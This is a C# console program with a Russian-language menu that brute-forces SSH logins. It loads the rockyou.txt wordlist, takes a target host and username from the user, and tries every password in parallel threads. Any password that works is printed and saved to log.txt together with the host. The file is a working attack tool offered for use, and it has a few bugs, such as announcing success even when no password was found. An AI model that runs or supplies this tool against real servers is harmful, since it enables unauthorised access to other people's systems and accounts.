using System;
using Renci.SshNet;
using Renci.SshNet.Common;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.ComponentModel.Design;

class Program
{
    static string filePath = "rockyou.txt";
    static int maxThreads = 15;

    static object consoleLock = new object();

    static volatile bool stopAll = false;

    static async Task Main()
    {

        while (true)
        {
            int choice = ShowMenu();

            switch (choice)
            {
                case 0:
                    stopAll = false;
                    await RunBrute();
                    break;
                case 1:
                    ShowSettings();
                    break;
                case 2:
                    Exit();
                    return;
            }
        }
    }

    // меню
    static int ShowMenu()
    {
        int selected = 0;

        while (true)
        {
            Console.Clear();

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("===== SSH BRUTE=====\n");
            Console.ResetColor();

            Console.WriteLine($"1. Старт");
            Console.WriteLine($"2. Настройки");
            Console.WriteLine("3. Выход");

            var key = Console.ReadKey(true).Key;

            if (key == ConsoleKey.D1)
            {
                selected = 0;
                return selected;
            }
            else if (key == ConsoleKey.D2)
            {
                selected = 1;
                return selected;
            }
            else if (key == ConsoleKey.D3)
            {
                selected = 2;
                return selected;
            }
            else
            {
                Console.WriteLine("Невозможный выбор");
                Main();       
            }
        }
    }

    // брутфорс
    static async Task RunBrute()
    {
        Console.Clear();

        if (!File.Exists(filePath))
        {
            WriteColored("Файл словаря не найден.", ConsoleColor.Red);
            Wait();
            return;
        }

        var dictionary = File.ReadAllLines(filePath)
                             .Where(x => !string.IsNullOrWhiteSpace(x))
                             .ToList();

        Console.Write("Введите IP или домен: ");
        string host = Console.ReadLine();

        Console.Write("Введите пользователя: ");
        string username = Console.ReadLine();

        Console.Clear();
        Console.WriteLine("=== Подбор запущен ===\n");

        int total = dictionary.Count;
        int checkedCount = 0;

        var semaphore = new SemaphoreSlim(maxThreads);
        int found = 0;

        int progressLine = Console.CursorTop;

        var tasks = new List<Task>();

        foreach (string password in dictionary)
        {
            if (stopAll)
                break;

            await semaphore.WaitAsync();

            var task = Task.Run(() =>
            {
                try
                {
                    if (stopAll)
                        return;

                    using (var client = new SshClient(host, username, password))
                    {
                        client.Connect();

                        if (client.IsConnected &&
                            Interlocked.CompareExchange(ref found, 1, 0) == 0)
                        {
                            client.Disconnect();
                            stopAll = true;

                            lock (consoleLock)
                            {
                                Console.SetCursorPosition(0, progressLine + 2);

                                WriteColored("\n=== УСПЕХ ===", ConsoleColor.Green);
                                Console.WriteLine($"IP: {host}");
                                Console.WriteLine($"User: {username}");
                                Console.WriteLine($"Password: {password}");

                                File.AppendAllText("log.txt",
                                    $"SUCCESS {host} {username} {password}\n");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Console.WriteLine("Ошибка: " + ex.Message);
                }
                finally
                {
                    Interlocked.Increment(ref checkedCount);

                    if (!stopAll)
                    {
                        lock (consoleLock)
                        {
                            DrawStatus(progressLine, checkedCount, total);
                        }
                    }

                    semaphore.Release();
                }
            });

            tasks.Add(task);
        }

        await Task.WhenAll(tasks);

        WriteColored("\nПароль найден! Результат добавлен в log.txt", ConsoleColor.Cyan);
        Wait();
    }

    // ================= STATUS =================
    static void DrawStatus(int line, int checkedCount, int total)
    {
        double progress = (double)checkedCount / total;
        int barWidth = 40;
        int filled = (int)(progress * barWidth);

        string bar = "[" +
                    new string('█', filled) +
                    new string('░', barWidth - filled) +
                    "]";

        Console.SetCursorPosition(0, line);

        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.Write($"ПРОГРЕСС: {bar} {(progress * 100):F1}%   ");
        Console.ResetColor();

        Console.SetCursorPosition(0, line + 1);
        Console.Write($"Проверено: {checkedCount} / {total}     ");
    }

    // ================= SETTINGS =================
    static void ShowSettings()
    {
        while (true)
        {
            Console.Clear();

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("===== НАСТРОЙКИ =====\n");
            Console.ResetColor();

            Console.WriteLine($"1. Потоки: {maxThreads}");
            Console.WriteLine($"2. Словарь: {filePath}");
            Console.WriteLine("3. Назад");

            var key = Console.ReadKey(true).Key;

            if (key == ConsoleKey.D1)
            {
                Console.Write("\nНовое значение: ");
                if (int.TryParse(Console.ReadLine(), out int t))
                    maxThreads = t;
            }
            else if (key == ConsoleKey.D2)
            {
                Console.Write("\nНовый путь: ");
                filePath = Console.ReadLine();
            }
            else if (key == ConsoleKey.D3)
                return;
        }
    }

    // ================= UTILS =================
    static void WriteColored(string text, ConsoleColor color)
    {
        Console.ForegroundColor = color;
        Console.WriteLine(text);
        Console.ResetColor();
    }

    static void Wait()
    {
        Console.WriteLine("\nНажмите любую клавишу...");
        Console.ReadKey();
    }

    static void Exit()
    {
        Console.Clear();
        WriteColored("Выход...", ConsoleColor.Magenta);
        Thread.Sleep(1000);
    }
}